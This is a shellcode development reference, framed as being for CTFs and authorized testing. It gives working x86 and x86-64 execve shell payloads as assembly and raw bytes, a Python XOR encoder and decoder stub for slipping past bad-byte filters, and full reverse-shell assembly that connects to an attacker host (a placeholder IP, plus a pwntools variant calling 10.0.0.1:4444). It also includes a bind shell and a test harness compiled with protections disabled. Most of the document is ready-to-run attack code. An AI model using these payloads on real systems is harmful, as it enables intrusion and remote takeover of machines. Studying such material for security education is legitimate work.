# Shellcode Development Reference

> **Authorization Notice**: Shellcode development techniques are documented here for educational purposes, CTF challenges, and authorized security testing. Always operate within legal and ethical boundaries.

## System Call Table (Linux x86 / x86-64)

### Commonly Used Syscalls

| Syscall | x86 (32-bit) EAX | x86-64 RAX | Arguments |
|---|---|---|---|
| `exit` | 1 | 60 | `int status` |
| `read` | 3 | 0 | `int fd, char *buf, size_t count` |
| `write` | 4 | 1 | `int fd, char *buf, size_t count` |
| `open` | 5 | 2 | `char *filename, int flags, mode_t mode` |
| `close` | 6 | 3 | `int fd` |
| `execve` | 11 | 59 | `char *filename, char **argv, char **envp` |
| `dup2` | 63 | 33 | `int oldfd, int newfd` |
| `socket` | 359 | 41 | `int domain, int type, int protocol` |
| `connect` | 362 | 42 | `int sockfd, struct sockaddr *addr, socklen_t len` |
| `bind` | 361 | 49 | `int sockfd, struct sockaddr *addr, socklen_t len` |
| `listen` | 363 | 50 | `int sockfd, int backlog` |
| `accept` | 364 | 43 | `int sockfd, struct sockaddr *addr, socklen_t *len` |
| `mprotect` | 125 | 10 | `void *addr, size_t len, int prot` |
| `mmap` | 192 | 9 | `void *addr, size_t len, int prot, int flags, int fd, off_t offset` |

### Argument Passing

```
x86 (32-bit):
  Syscall number: EAX
  Arguments:      EBX, ECX, EDX, ESI, EDI, EBP
  Invoke:         int 0x80
  Return value:   EAX

x86-64:
  Syscall number: RAX
  Arguments:      RDI, RSI, RDX, R10, R8, R9
  Invoke:         syscall
  Return value:   RAX
```

---

## Common Shellcode Patterns

### 1. Minimal /bin/sh — x86 (32-bit)

Executes `execve("/bin/sh", NULL, NULL)`:

```nasm
; execve("/bin/sh", NULL, NULL)
; Syscall 11 (0x0b)

xor eax, eax        ; Clear EAX (avoid null bytes from mov eax, 0)
push eax             ; Push null terminator for string
push 0x68732f2f      ; Push "//sh" (extra / is harmless, avoids null)
push 0x6e69622f      ; Push "/bin"
mov ebx, esp         ; EBX = pointer to "/bin//sh\0" on stack
xor ecx, ecx         ; ECX = NULL (argv)
xor edx, edx         ; EDX = NULL (envp)
mov al, 0x0b         ; EAX = 11 (execve syscall number)
int 0x80             ; Trigger syscall
```

**Assembled bytes** (23 bytes, null-free):
```
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80
```

### 2. Minimal /bin/sh — x86-64

```nasm
; execve("/bin/sh", NULL, NULL)
; Syscall 59 (0x3b)

xor rsi, rsi         ; RSI = NULL (argv)
xor rdx, rdx         ; RDX = NULL (envp)
xor rax, rax         ; Clear RAX
push rax             ; Push null terminator
mov rdi, 0x68732f6e69622f  ; "/bin/sh" as 64-bit immediate
push rdi
mov rdi, rsp         ; RDI = pointer to "/bin/sh\0"
mov al, 0x3b         ; RAX = 59 (execve)
syscall
```

### 3. Write Message to stdout

```nasm
; write(1, "PWNED!\n", 7)
xor eax, eax
mov al, 4            ; syscall 4 = write
xor ebx, ebx
mov bl, 1            ; fd = 1 (stdout)
jmp short string_loc
return_here:
pop ecx              ; ECX = address of string (from jmp/call/pop)
xor edx, edx
mov dl, 7            ; length = 7
int 0x80
xor eax, eax
mov al, 1            ; syscall 1 = exit
xor ebx, ebx         ; status = 0
int 0x80
string_loc:
call return_here      ; Push address of string onto stack
db "PWNED!", 0x0a     ; The string (with newline)
```

---

## Null Byte Avoidance Techniques

Shellcode injected through string functions (`strcpy`, `gets`, `scanf`) cannot contain `\x00` because it terminates the copy.

### Common Null Byte Sources and Fixes

| Produces Null Bytes | Null-Free Replacement |
|---|---|
| `mov eax, 0` | `xor eax, eax` |
| `mov eax, 1` | `xor eax, eax; mov al, 1` or `xor eax, eax; inc eax` |
| `mov eax, 0x0b` | `xor eax, eax; mov al, 0x0b` |
| `/bin/sh\0` on stack | Push as two dwords: `push 0x68732f2f; push 0x6e69622f` |
| `mov [addr], 0` | `xor eax, eax; mov [addr], eax` |
| String with embedded null | Construct on stack with `push`, or use XOR encoding |
| `jmp` to far offset | Rearrange code to use short jumps, or use `jmp/call/pop` |

### The JMP/CALL/POP Technique

Used to get the address of data (strings) in shellcode without hardcoding addresses:

```nasm
jmp short find_string     ; Jump forward to the call instruction
got_string:
pop esi                   ; ESI = address of the string
; ... use ESI as pointer to the string ...

find_string:
call got_string           ; Push address of next instruction (the string) onto stack
db "/bin/sh"              ; String data immediately follows the call
```

Why it works: `call` pushes the address of the next instruction (the string bytes) onto the stack, then `pop` retrieves it.

### Stack Construction Method

Build strings on the stack to avoid storing them in the shellcode:

```nasm
xor eax, eax
push eax              ; null terminator
push 0x68732f2f       ; "//sh"
push 0x6e69622f       ; "/bin"
mov ebx, esp          ; EBX points to "/bin//sh\0"
```

---

## XOR Encoder / Decoder Stub

### Purpose

XOR encoding transforms shellcode so that known-bad bytes (nulls, newlines, etc.) are eliminated. A small decoder stub at the front reverses the encoding at runtime.

### Encoder (Python)

```python
def xor_encode(shellcode, key=0xAA):
    """XOR encode shellcode with a single-byte key."""
    encoded = bytearray()
    for byte in shellcode:
        encoded_byte = byte ^ key
        if encoded_byte == 0x00:
            raise ValueError(f"XOR with key {hex(key)} produces null at offset {len(encoded)}")
        encoded.append(encoded_byte)
    return bytes(encoded)

# Example
shellcode = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80'
key = 0xAA
encoded = xor_encode(shellcode, key)
print(f"Key: {hex(key)}")
print(f"Encoded: " + "".join(f"\\x{b:02x}" for b in encoded))
```

### Decoder Stub (x86 NASM)

```nasm
; XOR decoder stub
; Assumptions: encoded shellcode immediately follows this stub

jmp short call_decoder     ; Jump to the call instruction

decoder:
pop esi                    ; ESI = address of encoded shellcode
xor ecx, ecx
mov cl, SHELLCODE_LEN      ; Length of encoded shellcode

decode_loop:
xor byte [esi], XOR_KEY    ; Decode one byte in place
inc esi                    ; Move to next byte
loop decode_loop           ; Decrement ECX, loop if not zero
jmp short encoded_start    ; Jump to now-decoded shellcode

call_decoder:
call decoder               ; Push address of encoded shellcode
encoded_start:
; ... XOR-encoded shellcode bytes go here ...
```

### Combined Payload Structure

```
+========================+
| JMP to CALL            |  2 bytes
+------------------------+
| Decoder routine        |  ~15 bytes
|   POP ESI              |
|   MOV CL, length       |
|   XOR [ESI], key       |
|   INC ESI              |
|   LOOP                 |
|   JMP to decoded code  |
+------------------------+
| CALL to decoder        |  5 bytes
+------------------------+
| Encoded shellcode      |  Variable length
| (XORed with key)       |  Decoded in-place at runtime
+========================+
```

---

## Reverse Shell Construction

### Concept

A reverse shell connects back to the attacker's listening machine, providing a command shell over the network. This is useful when the target is behind a firewall that blocks inbound connections.

### Architecture

```
Attacker Machine                     Target Machine
+------------------+                +------------------+
| nc -lvp 4444     | <--- TCP ---  | Exploit triggers |
| (listening)      |   connection  | reverse shell    |
|                  |               | shellcode        |
| Gets /bin/sh     |               |                  |
| interactive      |               | connect() to     |
| shell access     |               | attacker:4444    |
+------------------+                +------------------+
```

### Reverse Shell Shellcode Steps (x86)

```nasm
; 1. Create socket: socket(AF_INET, SOCK_STREAM, 0)
xor eax, eax
push eax             ; protocol = 0
push 1               ; SOCK_STREAM = 1
push 2               ; AF_INET = 2
mov ecx, esp         ; args array
xor ebx, ebx
mov bl, 1            ; SYS_SOCKET = 1
mov al, 102          ; socketcall
int 0x80
mov esi, eax         ; Save socket fd in ESI

; 2. Connect: connect(sockfd, {AF_INET, port, ip}, 16)
xor eax, eax
push eax                  ; Padding
push 0x0101017f           ; IP: 127.1.1.1 (replace with attacker IP)
push word 0x5c11          ; Port: 4444 (0x115c in network byte order)
push word 2               ; AF_INET
mov ecx, esp              ; Pointer to sockaddr struct
push 16                   ; addrlen = 16
push ecx                  ; pointer to sockaddr
push esi                  ; sockfd
mov ecx, esp              ; args array
xor ebx, ebx
mov bl, 3                 ; SYS_CONNECT = 3
mov al, 102               ; socketcall
int 0x80

; 3. Redirect stdin/stdout/stderr: dup2(sockfd, 0/1/2)
xor ecx, ecx
mov cl, 2
dup2_loop:
mov al, 63               ; dup2
mov ebx, esi             ; oldfd = sockfd
int 0x80
dec ecx
jns dup2_loop            ; Loop for fd 2, 1, 0

; 4. Execute shell: execve("/bin/sh", NULL, NULL)
xor eax, eax
push eax
push 0x68732f2f
push 0x6e69622f
mov ebx, esp
xor ecx, ecx
xor edx, edx
mov al, 0x0b
int 0x80
```

### Using pwntools for Shellcode Generation

```python
from pwn import *

# Set architecture
context.arch = 'i386'  # or 'amd64'
context.os = 'linux'

# Generate common shellcode
sh = asm(shellcraft.sh())                          # /bin/sh
rev = asm(shellcraft.connect('10.0.0.1', 4444) +
          shellcraft.dupsh())                       # Reverse shell
bind = asm(shellcraft.bindsh(4444))                # Bind shell
read_flag = asm(shellcraft.cat('/flag.txt'))        # Read a file

# Encode to avoid bad bytes
encoded = asm(shellcraft.sh(), avoid=b'\x00\x0a\x0d')

# Check for bad bytes
print(f"Length: {len(sh)} bytes")
print(f"Contains null: {b'\\x00' in sh}")
print(f"Hex: {sh.hex()}")
```

---

## Port-Binding Shell Construction

### Concept

A port-binding (bind) shell opens a listening port on the target machine. The attacker then connects to this port to get a shell.

### Steps

```
1. socket()   - Create TCP socket
2. bind()     - Bind to a port (e.g., 4444)
3. listen()   - Start listening for connections
4. accept()   - Accept incoming connection
5. dup2()     - Redirect stdin/stdout/stderr to the socket
6. execve()   - Execute /bin/sh
```

### Bind Shell in pwntools (x86-64)

```python
from pwn import *
context.arch = 'amd64'

shellcode = asm('''
    /* socket(AF_INET, SOCK_STREAM, 0) */
    push 41
    pop rax
    push 2
    pop rdi
    push 1
    pop rsi
    xor edx, edx
    syscall
    mov r12, rax          /* save sockfd */

    /* bind(sockfd, {AF_INET, 4444, 0.0.0.0}, 16) */
    xor eax, eax
    push rax              /* INADDR_ANY */
    push word 0x5c11      /* port 4444 */
    push word 2           /* AF_INET */
    mov rsi, rsp          /* pointer to sockaddr */
    mov rdi, r12          /* sockfd */
    push 49
    pop rax               /* bind */
    push 16
    pop rdx               /* addrlen */
    syscall

    /* listen(sockfd, 1) */
    mov rdi, r12
    push 1
    pop rsi
    push 50
    pop rax               /* listen */
    syscall

    /* accept(sockfd, NULL, NULL) */
    mov rdi, r12
    xor esi, esi
    xor edx, edx
    push 43
    pop rax               /* accept */
    syscall
    mov r13, rax          /* save client fd */

    /* dup2(clientfd, 0/1/2) */
    mov rdi, r13
    xor esi, esi
dup2_loop:
    push 33
    pop rax               /* dup2 */
    syscall
    inc esi
    cmp esi, 3
    jne dup2_loop

    /* execve("/bin/sh", NULL, NULL) */
    xor esi, esi
    xor edx, edx
    push rsi              /* null terminator */
    mov rdi, 0x68732f6e69622f
    push rdi
    mov rdi, rsp
    push 59
    pop rax               /* execve */
    syscall
''')

print(f"Bind shell: {len(shellcode)} bytes")
```

---

## Shellcode Testing Framework

### Quick Test Harness (C)

```c
/* test_shellcode.c
 * Compile: gcc -z execstack -fno-stack-protector -o test test_shellcode.c
 * Usage: ./test
 */
#include <stdio.h>
#include <string.h>

unsigned char shellcode[] =
    "\x31\xc0\x50\x68\x2f\x2f\x73\x68"
    "\x68\x2f\x62\x69\x6e\x89\xe3\x31"
    "\xc9\x31\xd2\xb0\x0b\xcd\x80";

int main() {
    printf("Shellcode length: %lu bytes\n", sizeof(shellcode) - 1);
    printf("Executing shellcode...\n");
    (*(void(*)())shellcode)();
    return 0;
}
```

### Testing with pwntools

```python
from pwn import *

context.arch = 'i386'
shellcode = asm(shellcraft.sh())

# Verify no bad bytes
assert b'\x00' not in shellcode, "Shellcode contains null bytes!"
assert b'\x0a' not in shellcode, "Shellcode contains newline!"

# Test execution
p = run_shellcode(shellcode)
p.interactive()
```

---

## Shellcode Size Optimization Tips

| Technique | Saves | Example |
|---|---|---|
| Use `xor reg, reg` instead of `mov reg, 0` | 3 bytes | `xor eax, eax` (2B) vs `mov eax, 0` (5B) |
| Use `push imm8; pop reg` for small values | 1-3 bytes | `push 59; pop rax` (3B) vs `mov rax, 59` (7B) |
| Use `cdq` to zero EDX (when EAX is positive) | 1 byte | `cdq` (1B) vs `xor edx, edx` (2B) |
| Use `mul reg` to zero EAX and EDX | 1 byte | `mul ecx` if ECX=0 zeros EAX+EDX (2B but multi-purpose) |
| Reuse register values across syscalls | Variable | Don't re-zero registers that are already zero |
| Use short jumps | 1 byte | `jmp short` (2B) vs `jmp near` (5B) |
| Combine string pushes | Variable | Use `//sh` (4 bytes, no null) instead of `/sh\0` |
